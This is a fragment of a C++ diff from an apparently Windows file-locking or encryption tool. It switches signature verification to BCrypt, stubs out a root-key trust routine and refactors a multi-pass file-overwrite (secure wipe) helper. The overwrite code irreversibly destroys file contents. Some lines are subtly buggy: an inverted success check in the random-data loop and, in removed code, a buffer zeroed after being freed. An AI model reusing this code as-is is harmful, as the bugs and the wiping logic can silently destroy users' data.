+				BCRYPT_PAD_PKCS1)
+			)
+		)
+	{
+		LOG_ERROR(L"[BCryptVerifySignature] Failed; %ls", PathLocale);
+		if (status == 0xC000A000)
+			LOG_ERROR(L"[BCryptVerifySignature] The cryptographic signature is INVALID");
+		goto end;
 	}
 	else
-	{
-		key = SignatureRoot;
-		if (!CryptAcquireContextA(&CryptoProvider, NULL, NULL, PROV_RSA_AES, 0))
-		{
-			LOG_ERROR(L"Failed create provider. GetLastError = %lu.\n", GetLastError());
-			return FALSE;
-		}
+		LOG_SUCCESS(L"[BCryptVerifySignature] The cryptographic signature is VALID");
 
-		if (!CryptImportKey(CryptoProvider, SignatureRoot, sig_len, 0, 0, &RsaKey))
-		{
-			LOG_ERROR(L"CryptImportKey failed. GetLastError() = %lu\n", GetLastError());
-			return FALSE;
-		}
-	}
-
-
-	WCHAR* locale = (WCHAR*)memory::m_malloc((MAX_PATH + MAX_PATH) * sizeof(WCHAR));
-	GetCurrentDirectoryW(MAX_PATH, locale);
-	if(!SignatureName)
-		wmemcpy_s(&locale[memory::StrLen(locale)], 20, L"\\signature.laced.txt", 20);
-	else
-		wmemcpy_s(&locale[memory::StrLen(locale)], memory::StrLen(SignatureName), SignatureName, memory::StrLen(SignatureName));
-
-	FileInfo.FilePath = locale;
-	if (!getParseFile(&FileInfo))
-	{
-		LOG_ERROR(L"Failed getParseFile file doesnt exist. Verify hash file %ls; GetLastError = %lu\n", locale, GetLastError());
-		goto END;
-	}
-
-	Buffer = (BYTE*)memory::m_malloc(FileInfo.Filesize);
-	if (!ReadFile(FileInfo.FileHandle, Buffer, FileInfo.Filesize, &dwread, NULL) || dwread != FileInfo.Filesize)
-	{
-		LOG_ERROR(L"Failed ReadFile %ls; GetLastError = %lu\n", locale, GetLastError());
-		goto END;
-	}
-
-	sha256_state ctx;
-	sha256_init_context(&ctx);
-	SLIST_FOREACH(DataHash, HashList)
-		sha256_update_context(&ctx, (CONST u8*)DataHash->hash, DataHash->hash_size);
-	sha256_final_context(&ctx, HASH_SHA);
-
-
-	if (!CryptCreateHash(CryptoProvider, CALG_SHA_256, 0, 0, &hHash)) 
-	{
-		LOG_ERROR(L"Failed CryptCreateHash. GetLastError =  %lu\n", GetLastError());
-		goto END;
-	}
-	
-	if (!CryptHashData(hHash, HASH_SHA, 32, 0)) 
-	{
-		LOG_ERROR(L"Failed CryptHashData. GetLastError =  %lu\n", GetLastError());
-		goto END;
-	}
-
-	if (!CryptVerifySignatureA(hHash, Buffer, dwread, RsaKey, NULL, 0)) 
-	{
-		LOG_ERROR(L"Failed CryptVerifySignature. GetLastError = %lu\n", GetLastError());
-		LOG_ERROR(L"Signature verification is FAILED\n");
-	}
-	else
-		LOG_SUCCESS(L"Signature verification SUCCESS\n");
 
 	success = TRUE;
+end:
 
-END:
-	if(FileInfo.FileHandle) CloseHandle(FileInfo.FileHandle);
-	if (hHash) CryptDestroyHash(hHash);
-	if (RsaKey) CryptDestroyKey(RsaKey);
-	if (CryptoProvider) CryptReleaseContext(CryptoProvider, 0);
-	memory::m_free(locale);
-	if (Buffer)
-		memory::m_free(Buffer);
-	if (!SignatureRoot && key)
+	if(PathLocale) 
+		memory::m_free(PathLocale);
+	if(SignatureBuffer)
+		memory::m_free(SignatureBuffer);
+	if (CryptInfo.desc.key_data)
 	{
-		memory::m_free(key);
-		memory::memzero_explicit(key, 4096);
+		memory::memzero_explicit(CryptInfo.desc.key_data, 4096);
+		memory::m_free(CryptInfo.desc.key_data);
 	}
-
-
+	if (FileInfo.FileHandle)
+		CloseHandle(FileInfo.FileHandle);
+	
 	return success;
 }
 
+/*	TODO:	*/
 VOID filesystem::RootKeySignatureTrust(VOID)
 {
-	SLIST<HASH_LIST>* HashListRoot = new SLIST<HASH_LIST>;
-	BYTE* g_PublicKeyRoot = NULL;
-	BYTE* g_PrivateKeyRoot = NULL;
-	DWORD size = 0;
-	FILE_INFO FileInfo;
-	FileInfo.FilePath = global::GetPath();
-	if (!getParseFile(&FileInfo))
-		goto end;
-	HashSignatureFile(HashListRoot, &FileInfo);	
-	
-	if (global::GetStatus())
-	{
-		locker::LoadPrivateRootKey(&g_PrivateKeyRoot, &size);
-		if (!g_PrivateKeyRoot)
-		{
-			LOG_ERROR(L"Failed Load Public Root Key\n");
-			goto end;
-		}
-		CreateSignatureFile(HashListRoot, (WCHAR*)L"\\SignatureUserKey.txt", g_PrivateKeyRoot, size);
-	}
-	else
-	{		
-		locker::LoadPublicRootKey(&g_PublicKeyRoot, &size);
-		if (!g_PublicKeyRoot)
-		{
-			LOG_ERROR(L"Failed Load Public Root Key\n");
-			goto end;
-		}
-		VerificationSignatureFile(HashListRoot, (WCHAR*)L"\\SignatureUserKey.txt", g_PublicKeyRoot, size);
-	}
-
-end:
-	if (g_PublicKeyRoot)
-	{
-		memory::memzero_explicit(g_PublicKeyRoot, size);
-		memory::m_free(g_PublicKeyRoot);
-	}
-		
-	if (g_PrivateKeyRoot)
-	{
-		memory::memzero_explicit(g_PrivateKeyRoot, size);
-		memory::m_free(g_PrivateKeyRoot);
-	}
-	
-	PHASH_LIST Data = NULL;
-	SLIST_FOREACH(Data, HashListRoot)
-		delete[] Data->hash;
-	delete HashListRoot;
+//	SLIST<HASH_LIST>* HashListRoot = new SLIST<HASH_LIST>;
+//	BYTE* g_PublicKeyRoot = NULL;
+//	BYTE* g_PrivateKeyRoot = NULL;
+//	DWORD size = 0;
+//	FILE_INFO FileInfo;
+//	FileInfo.FilePath = global::GetPath();
+//	if (!getParseFile(&FileInfo))
+//		goto end;
+//	HashSignatureFile(HashListRoot, &FileInfo);	
+//	
+//	if (global::GetStatus())
+//	{
+//		locker::LoadPrivateRootKey(&g_PrivateKeyRoot, &size);
+//		if (!g_PrivateKeyRoot)
+//		{
+//			LOG_ERROR(L"Failed Load Public Root Key\n");
+//			goto end;
+//		}
+//		//CreateSignatureFile(HashListRoot, (WCHAR*)L"\\SignatureUserKey.txt", g_PrivateKeyRoot, size);
+//	}
+//	else
+//	{		
+//		locker::LoadPublicRootKey(&g_PublicKeyRoot, &size);
+//		if (!g_PublicKeyRoot)
+//		{
+//			LOG_ERROR(L"Failed Load Public Root Key\n");
+//			goto end;
+//		}
+//		//VerificationSignatureFile(HashListRoot, (WCHAR*)L"\\SignatureUserKey.txt", g_PublicKeyRoot, size);
+//	}
+//
+//end:
+//	if (g_PublicKeyRoot)
+//	{
+//		memory::memzero_explicit(g_PublicKeyRoot, size);
+//		memory::m_free(g_PublicKeyRoot);
+//	}
+//		
+//	if (g_PrivateKeyRoot)
+//	{
+//		memory::memzero_explicit(g_PrivateKeyRoot, size);
+//		memory::m_free(g_PrivateKeyRoot);
+//	}
+//	
+//	PHASH_LIST Data = NULL;
+//	SLIST_FOREACH(Data, HashListRoot)
+//		delete[] Data->hash;
+//	delete HashListRoot;
 }
 
 
@@ -1673,7 +1829,7 @@ WCHAR* filesystem::MakeCopyFile(WCHAR* Path, WCHAR* Filename, WCHAR* exst, WCHAR
 }
 
 
-STATIC BOOL Write(FILE_INFO* fi, BYTE* buff, LPCWCHAR Path)
+STATIC BOOL Write(FILE_INFO* fi, BYTE* buff)
 {
 	size_t size_mb = 1048576;  // 1 MB	
 	SetFilePointer(fi->FileHandle, 0, NULL, FILE_BEGIN);
@@ -1685,7 +1841,7 @@ STATIC BOOL Write(FILE_INFO* fi, BYTE* buff, LPCWCHAR Path)
 		toWrite = (DWORD)fsize >= size_mb ? size_mb : fsize;
 		if (!WriteFullData(fi->FileHandle, buff, toWrite))
 		{
-			LOG_ERROR(L"Failed WriteFullData in OverWriteFile %ls. GetLastError = %lu\n", Path, GetLastError());
+			LOG_ERROR(L"Failed WriteFullData in OverWriteFile %ls. GetLastError = %lu\n", fi->FilePath, GetLastError());
 			return FALSE;
 		}
 		written += toWrite;
@@ -1703,7 +1859,7 @@ BOOL filesystem::OverWriteFile(PFILE_INFO FileInfo)
 		memory::memzero_explicit(zeros, 1048576);
 		for (int i = 0; i < global::GetCountOverWrite(); ++i)
 		{
-			if (!Write(FileInfo, zeros, FileInfo->FilePath))						
+			if (!Write(FileInfo, zeros))						
 				return FALSE;			
 		}
 		memory::m_free(zeros);
@@ -1725,7 +1881,7 @@ BOOL filesystem::OverWriteFile(PFILE_INFO FileInfo)
 		{
 			for (int i = 0; i < global::GetCountOverWrite(); ++i)
 			{
-				if (Write(FileInfo, random, FileInfo->FilePath))
+				if (Write(FileInfo, random))
 					return FALSE;
 			}
 		}
@@ -1735,9 +1891,9 @@ BOOL filesystem::OverWriteFile(PFILE_INFO FileInfo)
 			memory::memzero_explicit(zeros, 1048576);
 			for (int i = 0; i < global::GetCountOverWrite(); ++i)
 			{
-				if (!Write(FileInfo, zeros, FileInfo->FilePath))
+				if (!Write(FileInfo, zeros))
 					return FALSE;
-				if (!Write(FileInfo, random, FileInfo->FilePath))
+				if (!Write(FileInfo, random))
 					return FALSE;
 			}
 			memory::m_free(zeros);
